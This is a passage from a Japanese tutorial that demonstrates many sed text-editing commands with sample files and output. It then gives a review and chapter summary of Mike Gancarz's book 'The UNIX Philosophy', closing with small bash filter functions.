$ cat os_blank.txt | sed '/^$/d'
Windows
Linux
Android
OS
```

{{% tips-list tips %}}
ヒント
: ^$ は 行頭（^)と行末（$)の間になにもない（空行）という意味になります。ものすごく良く使います。
{{% /tips-list %}}


### 印刷できない文字をすべて削除
印刷できない文字をnoneに置き換えることにより、印刷できない文字を任意のテキストから削除できます。
この例では、[:print:]クラスを使用して、印刷できない文字を検索します。'\ t'は印刷できない文字なので、`echo`コマンドで直接解析することはできません。
以下のコマンドを実行すると、「echo」コマンドで使用される変数$tabに「\t」文字が混入しても、`sed`コマンドで[:print:]に該当する文字'\t'が削除されます。

実行結果は以下のとおりです。
```
$ tab=$'\t'
$ echo Hello"$tab"World
Hello	World
$ echo Hello"$tab"World | sed 's/[^[:print:]]//g'
HelloWorld
$
```
{{% tips-list tips %}}
ヒント
: 上記のコマンドを実行すると、次の出力が表示されます。最初の`echo`コマンドはTAB付きで出力し、`sed`コマンドの[^[:print:]]出力できない文字であるタブスペースを削除し出力します。
{{% /tips-list %}}


### 一致した場合行末に文字列を追加
次の`sed`コマンドは、 os.txtファイルのテキスト「Windows」を含む行の最後に「10」を追加します。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/Windows/ s/$/ 10/'
Windows 10
Linux
Android
OS
```


### 一致した場合行前に行を挿入
次の`sed`コマンドは、前に作成されたinput.txtファイルの「PHP is platform-independent」というテキストを検索します。ファイルのいずれかの行にこのテキストが含まれている場合、「PHP is an interpreted language」がその行の前に挿入されます。

```:input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
```

実行結果は以下のとおりです。
```
cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
cat input.txt | sed '/PHP is platform-independent/ s/^/PHP is an interpreted language.\n/'
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is an interpreted language.
PHP is platform-independent.
```

### 一致したら一致行の下に文字列を挿入
次の`sed`コマンドは、ファイルos.txt内のテキスト' Linux'を検索し、テキストがいずれかの行に存在する場合は、新しいテキスト' Ubuntu 'がその行の後に挿入されます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed 's/Linux/&\nUbuntu/'
Windows
Linux
Ubuntu
Android
OS
$
```

{{% tips-list tips %}}
ヒント
: &\n が自分自身の行のあとに改行という意味になります。
{{% /tips-list %}}


### 一致しない場合は行末に文字列を追加
次の`sed`コマンドは、os.txt内でテキスト「Linux」を含まない行を検索し、各行の最後にテキスト「Operating System」を追加します。ここで、「$」記号は、新しいテキストが追加される行を識別するために使用されます。

```:os.txt
Windows
Linux
Android
OS
```

```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/Linux/! s/$/ Operating System/'
Windows Operating System
Linux
Android Operating System
OS Operating System
```

{{% tips-list tips %}}
ヒント
: /Linux/! で、Linuxという文字列が行になければという意味、$は行末を意味します。Operation Systemの戦闘に空白が有るのがミソです。
{{% /tips-list %}}


### 一致しない行を削除
web.txtという名前のファイルを作成し、次のコンテンツを追加して、一致するパターンを含まない行を削除します。 

```:web.txt
HTML5
JavaScript
CSS
PHP
MySQL
JQuery
```

次の`sed`コマンドは、テキスト「CSS」を含まない行を検索して削除します。

実行結果は以下のとおりです。
```
$ cat web.txt
HTML5
JavaScript
CSS
PHP
MySQL
JQuery
$
$ cat web.txt | sed '/CSS/!d'
CSS
```

上記のコマンドを実行すると、次の出力が表示されます。'CSS'というテキストを含むファイルに1行あります。したがってCSSを含む1行だけが出力され、CSSを含まない行は削除されます。


### テキストの後にスペースを追加した後、一致したテキストを複製する
次の`sed`コマンドは、ファイルpython.txt内の'to'という単語を検索します。その単語が存在する場合は、スペースを追加して、同じ単語が検索単語の後に挿入されます。ここでは、「&」記号を使用して重複テキストを追加しています。

```:python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
```

```
$ cat python.txt
Python is a very popular language.
Python is easy to use. Python is easy to learn.
Python is a cross-platform language
$
$ cat python.txt | sed -e 's/to /& to/g'
Python is a very popular language.
Python is easy to  touse. Python is easy to  tolearn.
Python is a cross-platform language
$
```

{{% tips-list tips %}}
ヒント
: 意味のないサンプルとなりましたが、このコマンドを実行すると、「to」という単語がファイルpython.txtで検索され、この単語はこのファイルの2行目に存在することがわかります。結果、一致するテキストの後にスペースを含む「to 」が追加されます。
{{% /tips-list %}}

### 文字列のリストの1つを新しい文字列に置き換える
この例をテストするには、2つのリストファイルを作成する必要があります。

```:list1.txt
1001 => Jafar Ali
1023 => Nir Hossain
1067 => John Michel
```

```:list2.txt
1001    CSE     GPA-3.63
1002    CSE     GPA-3.24
1023    CSE     GPA-3.11
1067    CSE     GPA-3.84
```

次の`sed`コマンドは、上記の2つのテキストファイルの最初の列と一致し、一致するテキストをファイルlist1.txtの3番目の列の値に置き換えます。

実行結果は以下のとおりです。
```
$ cat list1.txt
1001 => Jafar Ali
1023 => Nir Hossain
1067 => John Michel
$
$ cat list2.txt
1001    CSE     GPA-3.63
1002    CSE     GPA-3.24
1023    CSE     GPA-3.11
1067    CSE     GPA-3.84
$
$ sed `cat list1.txt | awk '{print "-e s/"$1"/"$3"/"}'`<<<"` cat list2.txt`"
Jafar   CSE     GPA-3.63
1002    CSE     GPA-3.24
Nir     CSE     GPA-3.11
John    CSE     GPA-3.84
```

{{% tips-list tips %}}
ヒント
: list1.txtファイルの1001、1023、1067は、list2.txtファイルの3つのデータと一致し、これらの値は、list1.txtの3番目の列の対応する名前に置き換えられます。
{{% /tips-list %}}


### 一致した文字列を改行を含む文字列に置き換える
次のコマンドは、 `echo`コマンドから入力を受け取り、テキスト内の「Python」という単語を検索します。単語がテキストに存在する場合、新しいテキスト「Added Text」が改行で挿入されます。

```
$ echo "Bash Perl Python Java PHP ASP" | sed 's/Python/Added Text\n/'
Bash Perl Added Text
 Java PHP ASP
```

### ファイルから改行を削除し各行の最後にコンマを挿入
次の`sed`コマンドは、ファイルos.txtの各改行をコンマに置き換えます。ここで、-zオプションは、行をNULL文字で区切るために使用されます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed -z 's/\n/,/g'
Windows,Linux,Android,OS,$
```

### カンマを削除し、改行を追加して、テキストを複数の行に分割
次の`sed`コマンドは、`echo`コマンドからコンマで区切られた行を入力として受け取り、コンマを改行に置き換えます。

```
$ echo "Kaniz Fatema,30th,batch" | sed "s/,/\n/g"
Kaniz Fatema
30th
batch
```

{{% tips-list tips %}}
ヒント
: 上記のコマンドを実行すると、入力テキストのカンマは改行に置き換えられ3行で印刷されます。
{{% /tips-list %}}


### 大文字と小文字を区別しない一致を検索し、行を削除
次の`sed`コマンド'I'は、大文字と小文字を区別しないオプションです。一致で大文字と小文字を無視することを示します。

次の`sed`コマンドは、「linux」という単語を大文字小文字を区別せずに検索し、 os.txtファイルからその行を削除します。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed '/linux/Id'
Windows
Android
OS
```

### 大文字と小文字を区別しない一致を見つけて、新しいテキストに置き換える
次の`sed`コマンドは、`echo`コマンドからの入力を受け取り、単語'bash'を単語'PHP'に置き換えます。

「Bash」という単語は、大文字と小文字を区別しない検索のために「bash」という単語と一致し、「PHP」という単語に置き換えられています。

```
$ echo "I like bash programming " | sed 's/Bash/PHP/i'
I like PHP programming
```


### 大文字と小文字を区別しない一致を見つけて、同じテキストのすべて大文字に置き換える
'\U'は、テキストをすべて大文字に変換します。次の`sed`コマンドは、 os.txtファイル内の単語'linux'を大文字小文字を区別せずに検索し、単語が存在する場合は、単語をすべて大文字に置き換えます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed 's/\(linux\)/\U\1/Ig'
Windows
LINUX
Android
OS

```
### 大文字と小文字を区別しない一致を見つけて、同じテキストのすべての小文字に置き換える
'\L'は`sed`で使用され、テキストをすべて小文字に変換します。次の`sed`コマンドは、os.txtファイルの「Linux」という単語を検索し、その単語をすべて小文字に置き換えます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$ cat os.txt | sed 's/\(linux\)/\L\1/Ig'
Windows
linux
Android
OS
```

### テキスト内のすべての大文字を小文字に置き換える
次の`sed`コマンドは、os.txtファイル内のすべての大文字を検索し、「\L」を使用して文字を小文字に置き換えます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed  's/\(.*\)/\L\1/'
windows
linux
android
os
```

### 行の番号を検索し、番号の後に通貨記号を追加
以下のファイルを準備します。

```:items.txt
HDD       100
Monitor   80
Mouse     10
```

実行結果は以下の通りです。
```
$ cat items.txt
HDD       100
Monitor   80
Mouse     10
$
$ cat items.txt | sed 's/\([0-9]\)/$\1/'
HDD       $100
Monitor   $80
Mouse     $10
```

上記のコマンドを実行すると、次の出力が表示されます。ここでは、各行の番号の前に「$」記号が追加されています。


### 3桁を超える数値にコンマを追加
次の`sed`コマンドは、` echo`コマンドからの入力として数値を受け取り、右から数えて3桁の各グループの後にコンマを追加します。ここで、「：a」はラベルを示し、「ta」はグループ化プロセスを繰り返すために使用されます。

```
$ echo "5098673" | sed -e :a -e 's/\(.*[0-9]\)\([0-9]\{3\}\)/\1,\2/;ta'
5,098,673
```

{{% tips-list tips %}}
ヒント
: ようするに桁区切りを`sed`コマンドで実現するということです。
{{% /tips-list %}}


### タブ文字を4つのスペース文字に置き換えます
次の`sed`コマンドは、各タブ（\ t）文字を4つのスペース文字に置き換えます。「$」記号は「sed」コマンドでタブ文字と一致するように使用され、「g」はすべてのタブ文字を置き換えるために使用されます。

実行結果は以下のとおりです。\tという文字列が
```
$ echo -e "1\t2\t3" | sed $'s/\t/    /g'
1    2    3
```

### 4つの連続するスペース文字をタブ文字に置き換えます
次のコマンドは、4つの連続する文字をタブ（\ t）文字に置き換えます。

```
$ echo -e "1    2" | sed $'s/    /\t/g'
1	2
```

### すべての行を最初の80文字に切り捨てます
この例をテストするには、80文字を超える行を含むin.txtという名前のテキストファイルを作成します。

```:in.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
```

```
$ cat in.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.PHP is platform-independent.
$
$ cat in.txt | sed 's/\(^.\{1,80\}\).*/\1/'
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.PHP is platform-indepen
```

{{% tips-list tips %}}
ヒント
: 上記のコマンドを実行すると、次の出力が表示されます。in.txtファイルの2行目には、80文字を超える文字が含まれており、この行は出力で切り捨てられます。
{{% /tips-list %}}


### 文字列の正規表現を検索し、その後に標準テキストを追加
次の`sed`コマンドは、入力テキスト内のテキスト' hello 'を検索し、そのテキストの後にテキスト' John 'を追加します。

実行結果は以下のとおりです。
```
$ echo "hello, how are you?" | sed 's/\(hello\)/\1 John/'
hello John, how are you?
```


### 文字列の正規表現と、その後に見つかった文字列の2番目のコピーを検索します
次の`sed`コマンドは、 input.txtの各行のテキスト「 PHP 」を検索し、各行の2番目の一致をテキスト「NewTextAdded」に置き換えます。

```:input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
```

実行結果は以下のとおりです。
```
$ cat input.txt | sed 's/\(PHP\)/\1 (New Text added)/2'
PHP is a server-side scripting language.
PHP is an open-source language and PHP (New Text added) is case-sensitive.
PHP is platform-independent.
```

{{% tips-list tips %}}
ヒント
: 上記のコマンドを実行すると、次の出力が表示されます。検索テキスト「PHP 」は、 input.txtファイルの2行目と3行目に2回表示されます。そのため、2行目と3行目に「NewTextadded」というテキストが挿入されます。 
{{% /tips-list %}}

### ファイルからの複数行の`sed`スクリプトの実行
複数の`sed`スクリプトをファイルに保存し、`sed`コマンドを実行することですべてのスクリプトを一緒に実行できます。'sedcmd 'という名前のファイルを作成し、次のコンテンツを追加します。ここでは、2つの`sed`スクリプトがファイルに追加されています。1つのスクリプトがテキスト「PHP」を「ASP」に置き換えます。別のスクリプトがテキスト「独立」をテキスト「依存」に置き換えます。

```sedcmd
s/PHP/ASP/
s/independent/dependent/
```

```:input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
```

実行結果は以下のとおりです。
```
$ cat sedcmd
s/PHP/ASP/
s/independent/dependent/
$
$ cat input.txt
PHP is a server-side scripting language.
PHP is an open-source language and PHP is case-sensitive.
PHP is platform-independent.
$
$ cat input.txt | sed -f sedcmd
ASP is a server-side scripting language.
ASP is an open-source language and PHP is case-sensitive.
ASP is platform-dependent.
```

{{% tips-list tips %}}
ヒント
: 同様の検索ルールを別ファイルにしておくことで、何度も同じルールを書くことをしなくてすみます。必要なときにファイルを読み出せばよいわけです。
{{% /tips-list %}}


### 複数行のパターンに一致し、新しい複数行のテキストに置き換える
次の`sed`コマンドは、複数行のテキスト'Linux \ nAndroid'を検索し、パターンが一致する場合、一致する行は複数行のテキスト' Ubuntu \nAndroidLollipop'に置き換えられます。ここで、PとDはマルチライン処理に使用されます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed '$!N;s/Linux\nAndroid/Ubuntu\nAndoid Lollipop/;P;D'
Windows
Ubuntu
Andoid Lollipop
OS
```

{{% tips-list tips %}}
ヒント
: わけがわかりませんね。http://blog.livedoor.jp/morituri/archives/52036613.html　こちらを参考に。検索文字列は「sed Nコマンド」です。
{{% /tips-list %}}

### パターンに一致する2つの単語の順序を置き換えます
次の`sed`コマンドは、` echo`コマンドから2つの単語の入力を受け取り、これらの単語の順序を置き換えます。

実行結果は以下のとおりです。
```
$ echo "perl python" | sed -e 's/\([^ ]*\) *\([^ ]*\)/\2 \1/'
python perl
```

### コマンドラインから複数のsedコマンドを使用する
'-e'オプションは、コマンドラインから複数の`sed`スクリプトを実行するために`sed`コマンドで使用されます。次の`sed`コマンドは、` echo`コマンドからの入力としてテキストを受け取り、「Ubuntu」を「Kubuntu」に、「Centos」を「Fedora」に置き換えます。

実行結果は以下のとおりです。
```
$ echo "Ubuntu Centos Debian" | sed -e 's/Ubuntu/Kubuntu/; s/Centos/Fedora/'
Kubuntu Fedora Debian
```

### sedを他のコマンドと組み合わせる
次のコマンドは、`sed`コマンドと`cat`コマンドを組み合わせたものです。最初の`sed`コマンドはos.txtファイルから入力を受け取り、テキスト''Linux'を'Fedora'に置き換えた後、コマンドの出力を2番目の`sed`コマンドに送信します。2番目の`sed`コマンドは、テキスト「Windows」を「Windows10」に置き換えます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed 's/Linux/Fedora/'| sed 's/windows/Windows 10/i'
Windows 10
Fedora
Android
OS
```

{{% tips-list tips %}}
ヒント
: sedの連結は以下のように書くことができます。
{{% /tips-list %}}

```
$ cat os.txt | sed -e 's/Linux/Fedora/' -e  's/windows/Windows 10/i'
Windows 10
Fedora
Android
OS
bash-5.1$
```

{{% tips-list tips %}}
ヒント
: sed -e と書くことで、パイプで渡すことなく、sedコマンドを連続して使うことができます。 
{{% /tips-list %}}


### ファイルに空の行を挿入
次の内容のstdlist.txtを作成します。

```:stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
```

「G」オプションは、ファイルに空の行を挿入するために使用されます。次の`sed`コマンドは、 stdlistファイルの各行の後に空の行を挿入します。


実行結果は以下のとおりです。
```
$ cat stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
$
$ sed G stdlist.txt
#ID #Name

[ 101 ]    -Ali

[ 102 ]    -Neha

```

{{% tips-list tips %}}
ヒント
: 一見、使われそうなGオプションですが、使うシチュエーションに出会ったことがありません。
{{% /tips-list %}}



### ファイルの各行からすべての英数字を削除
次のコマンドは、 stdlistファイル内のすべての英数字をスペースに置き換えます。

```:stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
```

実行結果は以下のとおりです。
```
$ cat stdlist.txt
#ID #Name
[ 101 ]    -Ali
[ 102 ]    -Neha
$
$ cat stdlist.txt | sed 's/[A-Za-z0-9]//g'
# #
[  ]    -
[  ]    -
$
```

### 「&」を使用して文字列と一致させる
次のコマンドは、「L」で始まる単語を検索し、「Matched String is –」を「&」記号を使用して一致した単語に追加することでテキストを置き換えます。ここで、「p」は変更されたテキストを印刷するために使用されます。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt | sed -n 's/^L/Matched String is - &/p'
Matched String is - Linux
```

### 単語のペアを切り替える
各行に単語のペアを含む次のコンテンツを含むcourse.txtという名前のテキストファイルを作成します。

```:course.txt
PHP            ASP
MySQL          Oracle
CodeIgniter    Laravel
```

実行結果は以下のとおりです。
```
$ cat course.txt
PHP ASP
MySQL Oracle
CodeIgniter Laravel
$
$ cat course.txt | sed 's/\([^ ]*\) *\([^ ]*\)/\2 \1/'
ASP PHP
Oracle MySQL
Laravel CodeIgniter
$
```

### 各単語の最初の文字を大文字に変換する
次の`sed`コマンドは、` echo`コマンドから入力テキストを受け取り、各単語の最初の文字を大文字に変換します。

```
$ echo "I like bash programming" | sed 's/\([a-z]\)\([a-zA-Z0-9]*\)/\u\1\2/g'
I Like Bash Programming
```

{{% tips-list tips %}}
ヒント
: ここまでくると、カルト級ですね。使いこなせる人がいればほぼ神業ですね。
{{% /tips-list %}}


### ファイルの行番号を印刷する
'='記号は、ファイルの各行の前に行番号を出力するために`sed`コマンドで使用されます。次のコマンドは、os.txtファイルの内容を行番号とともに出力します。

```:os.txt
Windows
Linux
Android
OS
```

実行結果は以下のとおりです。
```
$ cat os.txt
Windows
Linux
Android
OS
$
$ cat os.txt |sed '='
1
Windows
2
Linux
3
Android
4
OS
```

{{% tips-list tips %}}
ヒント
: できれば行頭に行番号が来てほしいですね。工夫して頑張って作ってみてください。
{{% /tips-list %}}


```
$ cat os.txt | sed '=' | sed 'N;s/\n/ /'
```

{{% tips-list tips %}}
ヒント
: 楽しめましたか？では
{{% /tips-list %}}






## 【名著紹介】「UNIXという考え方」
これほどまでシンプルに「UNIX/Linuxとは」について書かれた本はない。

「エンジニアとしての信念はUNIXである」とはどういうことなのか。「プログラマとしてのコンセプトはLinuxなのだ」とはどういうことなのか。

そうした、少し偏屈なエンジニアに読んでもらいたい。また、UNIX/Linuxに興味を持っている若者の手にとってもらいたい。

安心してほしい。旅のしおり程度の大きさで厚さは文庫本の半分にも満たない。しかしその中身は、多くのエンジニアを下支えしてきたUNIXという骨について、わかりやすく、かんたんに、そして記憶に残るかずかずの珠玉の言葉を添えしっかりと書かれている。

稚拙ではあるが、ざっくりと要点も付け加えたので興味を持ってもらえたなら、ネット通販などでお買い求めいただきたい。

エンジニアには必須の名著一冊、ここに紹介する。

![UNIXという考え方](unix.jpg)

「UNIXという考え方」
著者 Mike Gancarz 著、芳尾 桂 監訳
定価 1,760円 （本体1,600円＋税）
判型 A5
頁 168頁
ISBN 978-4-274-06406-7
発売日 2001/02/24
発行元 オーム社


### UNIX的なものの考え方とは何か？

UNIXをUNIXらしく使いこなしたい、UNIXらしいプログラムを作りたい人のための一冊です。
OSの背後にある哲学を、9つの定理と平易な言葉で説く
OSを使いこなすためには、その背後にある「哲学」を理解することが必要です。本書では技術的詳細には立ち入らず、その代わりに、今まで文章で表されることが少なかったUNIXの考え方を、9つの「定理」にまとめて平易な言葉で明らかにしています。

定理1：スモール・イズ・ビューティフル
定理2：一つのプログラムには一つのことをうまくやらせる
定理3：できるだけ早く試作を作成する
定理4：効率より移植性
定理5：数値データはASCIIフラットファイルに保存する
定理6：ソフトウェアの挺子を有効に活用する
定理7：シェルスクリプトを使うことで挺子の効果と移植性を高める
定理8：過度の対話的インタフェースを避ける
定理9：すべてのプログラムをフィルタにする

### このような方におすすめ
UNIX系OSのユーザ、プログラマ。UNIXの世界観に興味のある人


### 主要目次
イントロダクション
第1章　UNIXの考え方：たくさんの登場人物たち
第2章　人類にとっての小さな一歩
第3章　楽しみと実益をかねた早めの試作
第4章　移植性の優先順位
第5章　これこそ挺子の効果!
第6章　対話的プログラムの危険性
第7章　さらなる10の小定理
第8章　一つのことをうまくやろう
第9章　UNIXと他のオペレーティングシステムの考え方


### 詳細目次

第1章　UNIXの考え方：たくさんの登場人物たち
1.1 UNIXの考え方：簡単なまとめ

第2章　人類にとっての小さな一歩
2.1 定理1：スモール・イズ・ビューティフル
2.2 やさしいソフトウェア工学
2.3 定理2：一つのプログラムには一つのことをうまくやらせる

第3章　楽しみと実益をかねた早めの試作
3.1 定理3：できるだけ早く試作を作成する
3.2 人間による三つのシステム
3.3 人間による第一のシステム
3.4 人間による第二のシステム
3.5 人間による第三のシステム
3.6 第三のシステムの構築

第4章　移植性の優先順位
4.1 定理4：効率より移植性
4.2 事例研究——Atari 2600
4.3 定理5：数値データはASCIIフラットファイルに保存する
4.4 事例研究——あるUNIXプログラマの道具袋

第5章　これこそ挺子の効果!
5.1 定理6：ソフトウェアの梃子を有効に活用する
5.2 定理7：シェルスクリプトを使うことで梃子の効果と移植性を高める

第6章　対話的プログラムの危険性
6.1 定理8：過度の対話的インタフェースを避ける
6.2 定理9：すべてのプログラムをフィルタにする
6.3 UNIX環境：プログラムをフィルタとして使う

第7章　さらなる10の小定理
7.1 (1) 好みに応じて自分で環境を調整できるようにする
7.2 (2) オペレーティングシステムのカーネルを小さく軽くする
7.3 (3) 小文字を使い、短く
7.4 (4) 木を守る
7.5 (5) 沈黙は金
7.6 (6) 並行して考える
7.7 (7) 部分の総和は全体よりも大きい
7.8 (8) 90パーセントの解を目指す
7.9 (9) 劣るほうが優れている
7.10 (10) 階層的に考える

第8章　一つのことをうまくやろう
8.1 UNIXの考え方：総括

第9章　UNIXと他のオペレーティングシステムの考え方
9.1 Atariホームコンピュータ——芸術としての人間工学
9.2 MS-DOS——7000万人以上のユーザが間違っているはずがない
9.3 OpenVMS——UNIXへのアンチテーゼ？



### ざっくりななめよみ、鈴木めも


### 小さいものは美しい　「スモールイズビューティフル」

小さなプログラムはわかりやすい
小さなプログラムは保守しやすい
小さなプログラムはシステムリソースに易しい
小さなプログラムは他のツールと組み合わせやすい

「伝統的なプログラマは、巨大なアメリカンプログラムによって、
　　世界中の全ての問題を一つのプログラムで解決しようとする。」
「プログラムの９０％はクズである。
　　ただしあらゆるものの９０％はクズである。」

パラメータが一行に収まらない
メソッドが画面に収まらない
コメントを読まないと何をやっているのか思い出せない
lsでモジュール名が多すぎて画面の端から消えていってしまう
まだ開発中なのにエラーメッセージの意味を思い出せない
整理するためにソースコードを印刷している自分に気がついた




### 一つのプログラムには一つの事をうまくやらせる　「わかることは分けること」
「UNIXユーザーは、自分が何をしているのかをわかっている。
　　何をしているのかわからないのなら、ここにいるべきではない」
「一つの事をうまくやるようにプログラムを作れないのであれば、
　　おそらく問題をまだ完全に理解していない。」



a)ユーザーとの対話が必要か。パラメータではだめか
b)入力データは特殊フォーマットが必要か。フォーマット変換プログラムがすでにシステム上にないか。
c)出力データは特殊フォーマットが必要か。通常のASCIIファイルではだめか。
d)新しいプログラムを書かずとも似たような機能を持つ他のプログラムがあるのではないか。

「一つの事をうまくやるようにプログラムを作れないのであれば、
　　おそらく問題をまだ完全に理解していない。」
「しのびよる多機能主義。
　　プログラマはいつだってプログラムを遅くする方法を見つける。」

一つの事をうまくやるようにアプリケーションを書けば、それは必然的に小さなプログラムになる。
小さなプログラムは単一機能になる傾向があり、単一機能のプログラムは小さくなる傾向がある。


### 出来るだけ早く試作する　「反復と協調」
「試作によって学ぶ。早い試作はリスクを減らす。
　「正しく」やっている時間などない」
「「なにができるか」
　　むしろ重要な事は、「なにができないか」を知る事だ。」


三つのシステム
１．第一のシステム
　第一のシステムは正しくやっている時間などない。
　第一のシステムは追い詰められた人間が作る。
　第一のシステムのコンセプトは人々の想像力を刺激する。
　第一のシステムは一人かせいぜい数人からなる小さなグループで作られる。
　第一のシステムは高い情熱によって推進され開発は急速に進む。
　第一のシステムは実に性能がよい。

２．第二のシステム
　第二のシステムは第一のシステムで証明されたアイデアを継承する。
　第二のシステムは委員会が設計する。
　第二のシステムは委員会によりものごとを全て公開の場で自分自身の正当化のために議論を進める。
　第二のシステムは第一のシステムの成功に便乗し分け前にあずかろうとする自称専門家で作られる。
　第二のシステムは自称専門家によりリポジトリ、進捗管理ツールが導入され計画は遅延する。
　第二のシステムは自称専門家のプログラムにおきかえられ贅肉がつき象のようにゆっくり動く。
　第二のシステムは「最初の設計のひどい欠点を見違えるように改善」され多機能となり無知が使う。
　第二のシステムは三つのシステムの中で最悪のシステムである。

３．第三のシステム
　第三のシステムはこれまでのシステムへの反抗から生まれる。
　第三のシステムの名前が変わり、オリジナルのアイデアはもはや常識となる。
　第三のシステムは第一と第二のシステムの最良の特徴を組み合わせる。
　第三のシステムは設計者にとってようやく「正しく」やる事が出来る。
　第三のシステムはユーザーが実際に使用する機能しか含まれない。
　第三のシステムはディスク、メモリ、CPUサイクルなど最適なバランスが実現されている。
　第三のシステムは提供される性能レベルも良くバランスがとれている。

第一のシステムとして「試作」を１ナノ秒でも早く作り、
　第一のシステムと第二のシステムのサイクルを反復と協調し、
　　第三のシステムに向かって協力しながら進んでいく。


### 効率より移植性　bashとawkとsed
「最も効率の良い方法は、
　　ほとんどの場合「移植性」に欠ける。」
「移植か死か。優れたソフトウェアは移植され成長し、
　　それ以外は取り残され捨てられる。」


UNIXにおいてそれはシェルスクリプトしかない。
次のハードウェアはもっと速く走る。だからプログラムを速くするという誘惑に負けない。
わずかな速度を求めてCで書き直さない。それは時間の無駄だ。

シェルスクリプトをあれこれいじる余裕が一瞬でも生じればほとんどのプログラマは
　a) 新しい機能をいくつか付け加えようとする
　b) スクリプトそのものを洗練し、実行速度を高めようとする
　c) その一部、または大部分をCで書き直してパフォーマンスの向上を図ろうとする。

「最も効率の良い方法は、
　　ほとんどの場合「移植性」に欠ける。」
「移植か死か。優れたソフトウェアは移植され成長し、
　　それ以外は取り残され捨てられる。」

DQ1カートリッジ(64kb)用のコード
　自分のプログラマ人生で最も効率の良い、そして移植の難しいコード」を書いた。
　命令をデータとして扱い、データを命令として扱った。
　走査線が画面の右端から左端に引き返すまでの間を狙って命令を実行した。
　メモリ節約のためありとあらゆる技を駆使した。
　こうしてできあがったコードは芸術品と言えるほど見事なものだった。
　フォルクスワーゲンのビートルに２０人ほど詰め込むようなものだった。
　そして保守担当者にとっては究極の悪夢でもあった。


### 出力結果はASCIIフラットファイルに保存する　中間ファイルは作らない　RDBは使わない
「動かせないデータは死んだデータだ。」

出力結果はASCIIフラットファイルに保存する。
安易と稚拙な知識でRDBを使わない。
むやみに中間ファイルをはき出さない。
素晴らしいシステムは中間ファイルI/Oがゼロで、
 全てがメモリ上で稼働する。よってそこそこ高速に動く。


### ソフトウェアを梃子として使う　
「良いプログラマはよいコードを書く。
　　偉大なプログラマは良いコードを借りてくる。」

梃子の支点をいかに自分のほうに近づける事が出来るか
独自技術症候群を避け、すでにあるものにクリエイティブな付加価値をつける
独自技術症候群は創造性を伸ばさない。

「良いプログラマはよいコードを書く。
　　偉大なプログラマは良いコードを借りてくる。」



### シェルスクリプトによって梃子の効果と移植性を高める　パイプ
「私は人生で二度しか奇跡を見た事がない。
　　一つは核融合、もう一つは複利だ
　　　少量のものを繰り返し掛け合わせていく事で、
　　　　やがて奇跡的な規模に達する。」


シェルスクリプトには恐ろしいほどの梃子（てこ）の効果がある
シェルスクリプトは梃子の降下で時間も節約する
シェルスクリプトはCより移植性が高い

「熟練プログラマはシェルスクリプトを熱心に使う。
　　あなたもまたそうするべきだ。」
「UNIXの源流は高水準の抽象化モデル「シェルスクリプト」であり、
　　それは今も普遍である。」
「私は人生で二度しか奇跡を見た事がない。
　　一つは核融合、もう一つは複利だ
　少量のものを繰り返し掛け合わせていく事で、
　　やがて奇跡的な規模に達する。」アインシュタイン

シェルスクリプト一行はおよそ１万倍の複利を生む

```bash 
echo who | awk '{ print $1 ; }' | sort | uniq | sed -e "s/  /,  /g" ;
```

```
echo   177
who    755
awk   3411
sort  2614
uniq   302
sed   2093
---------------------
　　  9.353
```

処理をパイプでつなぎ処理全体を一行で完結させる。
「ひとつのことをうまくやる」の良い事例だ。

```bash
function sh_func_getTitle() {
  TITLE=$(echo ${URLGETOPT} | \
    while read line ;do
      if echo "$line" | grep -i "title=" > /dev/null; then
        echo "$line" | \
          sed -e "s/^.*title=\x27//g" \
              -e "s/\x27.*$//g" \
              -e "s/\r//g" \
              -e "s/<[^>]*>//g" \
              -e "s/^[●○■□△▽]//g"; 
      fi
    done
  );
}
```


### 全てのプログラムをフィルタとして設計する
　メソッド間の入力をstdin、出力はstdoutを使用する
オンメモリでコマンドフィルタとして稼働する。

```bash
function trim(){
  if [ -p /dev/stdin ]; then
    cat - ;
  else
    echo -n ;
  fi | sed -e 's/^ *//g' -e 's/ *$//g'
}
```

実行結果
```
echo "      ほげ      " | trim ;
ほげ
```

以下でも良い。

```bash
function trim(){
  awk '{ print $1; }' | sed -e 's/^ *//g' -e 's/ *$//g'  </dev/stdin
}
